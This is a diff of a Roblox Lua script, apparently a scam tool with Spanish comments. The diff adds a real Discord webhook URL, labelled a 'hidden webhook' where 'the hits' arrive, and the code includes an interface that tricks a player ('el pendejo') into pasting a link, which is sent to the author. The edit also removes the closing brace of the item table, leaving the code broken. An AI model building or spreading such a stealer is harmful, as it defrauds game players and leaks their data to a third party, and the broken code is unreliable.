@@ -4,15 +4,14 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- 1. TU WEBHOOK OCULTO (Aquí te llegan los hits a ti)
-local TuWebhookSecret = "TU_URL_DE_WEBHOOK_AQUI" 
+local TuWebhookSecret = "https://discord.com/api/webhooks/1488017742165573812/JAj3XSpot3xrAxRWtD9XcJb7cnDaFQb5Xs9O9ha0lSHtJ5eaovFs0GW47AhcCM6OePg6" 
 
 -- 2. BASE DE DATOS (Resumida para no dar lag)
 local brainrotDB = {
     ["John pork"] = "850m/s", ["Strawberry elephant"] = "750m/s", ["Meowl"] = "600m/s",
     ["Headless horseman"] = "500m/s", ["Skibidi toilet"] = "450m/s", ["Griffin"] = "400m/s",
     ["Dragon cannelloni"] = "250m/s", ["Celestial pegasus"] = "175m/s", ["Cerberus"] = "175m/s"
-    -- Agrega los demás que necesites aquí...
-}
+  
 
 -- 3. INTERFAZ PARA QUE EL PENDEJO PEGUE SU LINK
 local sg = Instance.new("ScreenGui", player.PlayerGui)
